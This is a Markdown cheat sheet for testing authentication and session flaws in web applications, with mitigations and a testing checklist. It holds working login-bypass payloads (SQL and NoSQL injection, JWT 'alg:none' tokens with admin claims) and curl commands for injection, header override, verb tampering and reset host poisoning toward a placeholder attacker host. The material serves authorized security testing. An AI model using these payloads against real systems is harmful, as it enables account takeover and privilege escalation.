# 🔐 Authentication Bypass Cheat Sheet

> **Quick reference** for testing broken authentication and session controls.

> ⚠️ **Scope note:** Only assess systems you own or are explicitly authorized to test. Use placeholder credentials (`<USER>`, `<PASSWORD>`) and synthetic accounts; never use real secrets.

---
### 🧭 **1. Quick Reference**

| Area | Typical flaw |
|------|--------------|
| Login logic | SQL/NoSQL injection, type juggling |
| Session | Fixation, predictable token, no logout invalidation |
| Tokens | Unsigned JWT, weak secret, no expiry check |
| Reset / 2FA | Token reuse, host poisoning, skipped step |

---
### 🔍 **2. Common Vectors**

| Vector | Indicator |
|--------|-----------|
| Injection in login | Error on `'`, odd behavior with `"`, `true`, `[]` |
| Type juggling | PHP loose comparison: `"0e123"` == `"0e456"` |
| Parameter pollution | Duplicate `user=` params parsed differently by layers |
| Mass assignment | `role=admin`, `isAdmin=true` accepted on signup |
| Verb tampering | `HEAD`, `PUT`, `PATCH` bypass the auth filter |
| Path / header override | `/admin%2f`, `X-Original-URL`, `X-Rewrite-URL` |

---
### 🧪 **3. Login Bypass Payloads**

```text
' OR '1'='1' --
' OR 1=1 --
admin'--
```

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"username": "<USER>"}, {"username": {"$ne": null}}]}
```

```text
username[$ne]=null&password[$ne]=null
username=admin%00&password=<PASSWORD>
```

> 💡 Test one payload at a time; diff status, body length, redirects, and Set-Cookie.

---
### 🖥️ **4. Testing Commands**

```bash
# Baseline failed login, then injection probe
curl -i -c /tmp/jar.txt -X POST 'https://<TARGET>/login' \
  -d 'username=<USER>&password=<PASSWORD>'
curl -i -b /tmp/jar.txt -X POST 'https://<TARGET>/login' \
  -d "username=<USER>' OR '1'='1' -- &password=<PASSWORD>"

# Was a session actually granted?
curl -i -b /tmp/jar.txt 'https://<TARGET>/account'
```

```bash
# Forced browsing, verb tampering, header override
curl -i -X HEAD 'https://<TARGET>/admin'
curl -i -b 'session=<TOKEN>' -H 'X-Original-URL: /admin' 'https://<TARGET>/user'
curl -i 'https://<TARGET>/admin%2f'
```

---
### 🔑 **5. Token & Session Manipulation**

| Test | What to observe |
|------|-----------------|
| JWT `alg:none` | Signature removed, server still accepts |
| Weak HMAC secret | Offline brute-force of the signing key |
| Missing `exp` / `nbf` | Token accepted indefinitely |
| Session fixation | Pre-login `SID` accepted after login |
| Logout replay | Old cookie still valid after sign-out |

```bash
echo '<TOKEN>' | cut -d. -f2 | base64 -d 2>/dev/null
```

```json
{"alg": "none", "typ": "JWT"}
{"sub": "<USER>", "role": "admin", "exp": 9999999999}
```

---
### 🔄 **6. Password Reset & 2FA**

- Change only the host in `Host:` / `X-Forwarded-Host:` on a reset for `<USER>`.
- Replay the reset `<TOKEN>` after use; it should be single-use and account-bound.
- Look for client-side flags such as `2faVerified=true` or a skipped step parameter.
- Test 2FA codes for brute-force without rate limiting or lockout.
- Compare "unknown user" vs "known user" responses for enumeration.

```bash
curl -i -X POST 'https://<TARGET>/reset' \
  -H 'Host: <ATTACKER_HOST>' -d 'user=<USER>'
```

---
### 💥 **7. Impact**

- Account takeover and impersonation of `<USER>`.
- Privilege escalation to admin via role injection.
- Access to private data or internal panels.
- Persistence through unexpired tokens after password changes.

---
### 🛡️ **8. Mitigation**

- Use parameterized queries and typed input; reject objects where scalars are expected.
- Verify JWT signature, algorithm allow-list, `exp`, `iss`, `aud`; rotate secrets.
- Regenerate session IDs on login and privilege change; invalidate on logout.
- Apply rate limiting and MFA codes bound to the session and single-use.
- Centralize authorization; deny by default for admin routes and all verbs.
- Make reset tokens single-use, short-lived, account-bound; avoid host-derived URLs.

---
### ✅ **9. Testing Checklist**

- [ ] Injection probes on username and password
- [ ] Type-juggling and array/object parameter tests
- [ ] Duplicate-parameter and mass-assignment tests
- [ ] JWT header/payload/expiry inspection
- [ ] Session fixation and post-logout replay
- [ ] Verb tampering and path/header confusion
- [ ] Reset token reuse and 2FA step-skip checks

---
### 📚 **10. References**

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger: Authentication vulnerabilities](https://portswigger.net/web-security/authentication)
- [JWT.io – Debugger](https://jwt.io/)

---
**🛡️ Authenticate responsibly.**
